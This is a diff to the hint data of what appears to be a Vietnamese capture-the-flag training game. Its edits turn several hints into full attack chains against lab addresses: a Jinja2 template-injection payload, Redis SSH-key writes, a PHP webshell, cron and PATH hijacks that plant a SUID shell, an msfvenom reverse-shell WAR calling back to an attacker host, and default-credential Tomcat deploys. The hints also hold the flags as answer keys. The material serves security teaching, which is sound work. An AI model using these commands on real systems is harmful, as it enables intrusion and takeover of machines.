@@ -67,8 +67,8 @@ export default [
     ],
     hints: [
       'CMS phổ biến thì có công cụ enum riêng cho nó — nghĩ xem dùng gì để soi WordPress.',
-      'nmap -sV ra 80 = WordPress. Chạy `wpscan --url http://10.10.10.40 --enumerate vp` để lòi plugin dính lỗi, khai thác lấy www-data.',
-      'Sau khi là www-data: `cat /etc/crontab` -> root chạy /opt/backup/wp-backup.sh (world-writable). Append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt`.',
+      'Chạy `nmap -sV 10.10.10.40` thấy 80 = WordPress. Rồi `wpscan --url http://10.10.10.40 --enumerate vp` để lòi plugin dính lỗi.',
+      'Khai thác plugin: `curl http://10.10.10.40/shell.php?cmd=id` để có www-data shell. Sau đó `cat /etc/crontab` -> root chạy /opt/backup/wp-backup.sh (world-writable). Append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt`.',
     ],
     terms: [
       { term: 'foothold', def: 'Chỗ đứng đầu tiên trong hệ thống — shell quyền thấp (vd www-data) sau khi khai thác dịch vụ ngoài.' },
@@ -135,8 +135,8 @@ export default [
     ],
     hints: [
       'Máy mày chiếm được có thể có nhiều hơn một card mạng. Xem nó nối tới đâu trước đã.',
-      'Từ shell: `ip route` / `cat /var/www/html/notes.txt` -> thấy eth1 ở 172.16.0.0/24. Dựng SOCKS: `ssh -D 1080 user@10.10.10.45`.',
-      'Chạy `proxychains nmap -sT 172.16.0.10` rồi `proxychains` + exploit box nội bộ. Sau khi có shell: `cat /root/flag.txt`.',
+      'Xác nhận web shell trước: `curl http://10.10.10.45/shell.php?cmd=whoami` -> www-data. Rồi `ip route` / `cat /var/www/html/notes.txt` -> thấy eth1 ở 172.16.0.0/24. Dựng SOCKS: `ssh -D 1080 user@10.10.10.45`.',
+      'Chạy `proxychains nmap -sT 172.16.0.10` rồi `proxychains curl http://172.16.0.10:8080/exploit` để khai thác Samba/admin panel nội bộ. Sau khi có shell: `cat /root/flag.txt`.',
     ],
     terms: [
       { term: 'pivoting', def: 'Dùng một máy đã chiếm làm bàn đạp để tiếp cận mạng/host khác mà máy tấn công không tới trực tiếp được.' },
@@ -218,7 +218,7 @@ export default [
     ],
     hints: [
       'Bài hard, hint tối thiểu. Cổng dịch vụ thường (80/443) chưa chắc là tất cả — quét HẾT port. Và để ý cách API ký/duyệt token.',
-      'nmap -p- ra cổng lạ chạy API; gobuster tìm /dev (401). Lỗ hổng JWT: thử header `{"alg":"none"}` bỏ chữ ký để giả admin.',
+      '`nmap -p- 10.10.10.50` ra cổng lạ chạy API; `gobuster dir -u http://10.10.10.50:5000 -w wordlist.txt` tìm /dev (401). Lỗ hổng JWT: thử header `{"alg":"none"}` bỏ chữ ký để giả admin.',
       'Sau khi vào /dev: tham số bị nối thẳng vào lệnh hệ thống -> chèn `; id`. Có shell svc thì `cat .../user.txt`, rồi `find / -perm -4000 2>/dev/null` -> SUID python -> `os.setuid(0)` -> `cat /root/root.txt`.',
     ],
     terms: [
@@ -281,8 +281,8 @@ export default [
       { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'Ô nhập nào in lại y nguyên những gì mày gõ vào output đều đáng nghi — thử một biểu thức toán học xem nó có tự tính không.',
-      'Gửi `{{7*7}}` vào tham số name; nếu trả về 49 thay vì "7*7" thì engine đang EVAL template — đó là SSTI. Từ đó leo lên gọi os.popen qua chuỗi __class__.__init__.__globals__.',
+      'Ô nhập nào in lại y nguyên những gì mày gõ vào output đều đáng nghi — thử một biểu thức toán học xem nó có tự tính không. Trước đó nhớ `nmap -sV 10.10.10.60` để xác nhận đây là Flask.',
+      'Gửi `{{7*7}}` vào tham số name; nếu trả về 49 thay vì "7*7" thì engine đang EVAL template — đó là SSTI. Từ đó leo lên gọi os.popen qua chuỗi `{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}`.',
       'Có shell www-data thì `sudo -l` ngay — nếu thấy NOPASSWD: /usr/bin/find, tra GTFOBins: `sudo find . -exec /bin/sh \\; -quit` cho root, rồi `cat /root/flag.txt` -> FLAG{ssti_jinja2_rce_then_sudo_find_gtfobins}.',
     ],
     terms: [
@@ -353,9 +353,9 @@ export default [
       { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'Một database không hỏi mật khẩu gì cả là dấu hiệu nguy hiểm — và Redis có lệnh CHO PHÉP GHI FILE.',
+      'Một database không hỏi mật khẩu gì cả là dấu hiệu nguy hiểm — và Redis có lệnh CHO PHÉP GHI FILE. Trước đó nhớ `nmap -sV 10.10.10.65` để xác nhận Redis mở không auth.',
       'Connect bằng `redis-cli -h 10.10.10.65`. Dùng `CONFIG SET dir` + `CONFIG SET dbfilename` để đổi nơi Redis lưu dump, rồi `SET` nội dung public key của mày và `SAVE` để nó ghi xuống thành authorized_keys.',
-      'Trỏ dir vào `/var/lib/redis/.ssh`, dbfilename thành `authorized_keys`, SET một key chứa public key SSH của mày, SAVE, rồi `ssh redis@10.10.10.65 -i ~/.ssh/id_rsa`. Vào trong: `cat /etc/cron.d/redis-sync` lộ /opt/sync/flush.sh world-writable -> append payload SUID bash, đợi cron, `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{redis_unauth_ssh_key_then_cron_root}.',
+      'Trỏ dir vào `/var/lib/redis/.ssh`, dbfilename thành `authorized_keys`, SET một key chứa public key SSH của mày, SAVE, rồi `ssh redis@10.10.10.65 -i ~/.ssh/id_rsa`. Vào trong: `cat /etc/cron.d/redis-sync` lộ /opt/sync/flush.sh world-writable -> `echo \'cp /bin/bash /tmp/rb && chmod +s /tmp/rb\' >> /opt/sync/flush.sh`, đợi cron, `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{redis_unauth_ssh_key_then_cron_root}.',
     ],
     terms: [
       { term: 'Redis unauthenticated', def: 'Redis mặc định KHÔNG bật password — nếu expose ra ngoài, ai cũng đọc/ghi được toàn bộ dữ liệu và file.' },
@@ -393,7 +393,7 @@ export default [
       {
         id: 'groovy_rce',
         description: 'Chạy lệnh hệ thống qua Groovy script (Runtime.exec)',
-        match: /runtime\.getruntime|\.exec\(|groovy/i,
+        match: /runtime\.getruntime|\.exec\(|groovy|\.execute\(\)/i,
         output: 'println "id".execute().text -> uid=1000(jenkins). RCE qua Groovy console thành công, shell là jenkins user.',
       },
       {
@@ -415,9 +415,9 @@ export default [
       { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'Jenkins có một console cho phép viết và chạy script ngay trên server — nếu nó không yêu cầu đăng nhập thì đó là RCE miễn phí.',
+      'Jenkins có một console cho phép viết và chạy script ngay trên server — nếu nó không yêu cầu đăng nhập thì đó là RCE miễn phí. Trước đó `nmap -sV 10.10.10.70` để xác nhận cổng 8080.',
       'Vào `http://10.10.10.70:8080/script`. Nếu load thẳng không hỏi login, gõ Groovy: `println "id".execute().text` để chạy lệnh hệ thống.',
-      'Có shell jenkins thì `cat /var/lib/jenkins/secrets/credentials.xml` lộ mật khẩu admin; thử đúng mật khẩu đó cho `su root` (admin tái sử dụng password) -> root, rồi `cat /root/flag.txt` -> FLAG{jenkins_script_console_credential_reuse_root}.',
+      'Có shell jenkins thì `cat /var/lib/jenkins/secrets/credentials.xml` lộ mật khẩu admin; `cat /etc/passwd` xem có tài khoản root nào — thử đúng mật khẩu đó cho `su root` (admin tái sử dụng password) -> root, rồi `cat /root/flag.txt` -> FLAG{jenkins_script_console_credential_reuse_root}.',
     ],
     terms: [
       { term: 'Jenkins Script Console', def: 'Tính năng hợp pháp của Jenkins cho phép admin chạy Groovy script trực tiếp trên server — nếu không khoá auth thì biến thành RCE công khai.' },
@@ -485,7 +485,7 @@ export default [
     hints: [
       'Khi deploy code lên web server, có một thư mục ẨN dễ bị quên xoá mà chứa NGUYÊN lịch sử mọi commit từng có.',
       'Kiểm tra `curl http://10.10.10.75/.git/config`; nếu trả về nội dung thật thì dump cả repo bằng `git-dumper http://10.10.10.75/.git/ ./dump`. Rồi `git log -p` để soi từng commit, không chỉ commit mới nhất.',
-      'Secret "xoá" ở commit sau vẫn còn ở commit TRƯỚC — tìm thấy DEPLOY_API_KEY, dùng nó làm password SSH cho user deploy. Vào trong, privesc không qua SUID mà qua capability: `getcap -r /` lộ cap_setuid trên perl -> `perl -e \'use POSIX qw(setuid); setuid(0); exec "/bin/bash";\'` -> root, `cat /root/flag.txt` -> FLAG{git_history_leak_apikey_then_capability_privesc}.',
+      'Secret "xoá" ở commit sau vẫn còn ở commit TRƯỚC — chạy `git log -p | grep DEPLOY_API_KEY` để xác nhận key vẫn đọc được, dùng nó làm password SSH: `ssh deploy@10.10.10.75`. Vào trong, privesc không qua SUID mà qua capability: `getcap -r /` lộ cap_setuid trên perl -> `perl -e \'use POSIX qw(setuid); setuid(0); exec "/bin/bash";\'` -> root, `cat /root/flag.txt` -> FLAG{git_history_leak_apikey_then_capability_privesc}.',
     ],
     terms: [
       { term: '.git exposure', def: 'Lỗi deploy để nguyên thư mục .git trên webroot, lộ toàn bộ lịch sử commit kể cả thứ đã "xoá" ở commit sau.' },
@@ -546,9 +546,9 @@ export default [
       { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
     ],
     hints: [
-      'WordPress REST API đôi khi lộ thông tin mà không cần đăng nhập — thử endpoint liệt kê user. Sau khi có quyền admin, để ý cron của root gọi lệnh như thế nào.',
-      'Lấy username từ `curl http://10.10.10.80/wp-json/wp/v2/users`. Brute mật khẩu bằng wordlist nhỏ (`wpscan --url ... -U j.admin --passwords small.txt`). Đăng nhập xong, dùng Appearance > Theme Editor sửa 404.php chèn `system($_GET[\'cmd\'])`.',
-      'Sau RCE, `cat /etc/cron.d/site-backup` thấy root chạy lệnh `backup` KHÔNG dùng đường dẫn tuyệt đối trong thư mục mày ghi được — tạo file `/var/www/html/backup` giả (script cp+chmod+s /bin/bash), chmod +x, đợi cron, rồi `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{wp_weak_password_theme_editor_then_path_hijack}.',
+      'WordPress REST API đôi khi lộ thông tin mà không cần đăng nhập — thử endpoint liệt kê user. Trước đó `nmap -sV 10.10.10.80` để xác nhận WordPress. Sau khi có quyền admin, để ý cron của root gọi lệnh như thế nào.',
+      'Lấy username từ `curl http://10.10.10.80/wp-json/wp/v2/users`. Brute mật khẩu bằng wordlist nhỏ (`wpscan --url ... -U j.admin --passwords small.txt`). Đăng nhập xong, dùng `Theme Editor` sửa `404.php` chèn `system($_GET[\'cmd\'])`.',
+      'Sau RCE, `cat /etc/cron.d/site-backup` thấy root chạy lệnh `backup` KHÔNG dùng đường dẫn tuyệt đối trong thư mục mày ghi được — `echo \'#!/bin/bash\\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb\' > /var/www/html/backup && chmod +x /var/www/html/backup`, đợi cron, rồi `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{wp_weak_password_theme_editor_then_path_hijack}.',
     ],
     terms: [
       { term: 'WP REST API leak', def: 'Endpoint /wp-json/wp/v2/users của WordPress lộ username thật mà không cần xác thực — tiền đề cho brute-force.' },
@@ -614,9 +614,9 @@ export default [
       { id: 'read_root_flag', description: 'Đọc cờ root (root.txt)', match: /^cat\s+\/root\/root\.txt/ },
     ],
     hints: [
-      'Bài hard, hint tối thiểu. Port web chính chưa chắc là 80/443. Sau khi có shell quyền thấp, đừng dừng ở đó — luôn kiểm tra version kernel.',
-      'Full scan ra Tomcat ở 8080. Manager UI (/manager/html) hay dùng credential mặc định/yếu — thử admin:tomcat123. Tomcat Manager cho phép deploy file .war trực tiếp thành ứng dụng chạy được trên server.',
-      'Đóng gói webshell JSP thành .war (msfvenom hoặc thủ công), deploy qua API `/manager/text/deploy?path=...` -> RCE user tomcat -> đọc user.txt. Rồi `uname -a` lộ kernel 4.4.0-116, tra searchsploit ra CVE-2017-16995, compile và chạy exploit -> root -> `cat /root/root.txt` -> FLAG{kernel_cve_2017_16995_ebpf_privesc_root}.',
+      'Bài hard, hint tối thiểu. Port web chính chưa chắc là 80/443. Sau khi có shell quyền thấp, đừng dừng ở đó — luôn kiểm tra version kernel. Bắt đầu bằng `nmap -p- 10.10.10.90`.',
+      'Full scan ra Tomcat ở 8080. Thử `/manager/html` với credential mặc định/yếu — admin:tomcat123. Tomcat Manager cho phép deploy file .war trực tiếp thành ứng dụng chạy được trên server: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war`.',
+      'Deploy qua API: `curl --upload-file shell.war "http://admin:tomcat123@10.10.10.90:8080/manager/text/deploy?path=/shell"` -> RCE user tomcat -> `cat /home/tomcat/user.txt`. Rồi `uname -a` lộ kernel 4.4.0-116, tra `searchsploit` ra CVE-2017-16995, compile và chạy exploit -> root -> `cat /root/root.txt` -> FLAG{kernel_cve_2017_16995_ebpf_privesc_root}.',
     ],
     terms: [
       { term: 'Tomcat Manager', def: 'Trang quản trị web của Apache Tomcat, cho phép deploy/undeploy ứng dụng .war — nếu credential yếu thì biến thành RCE.' },
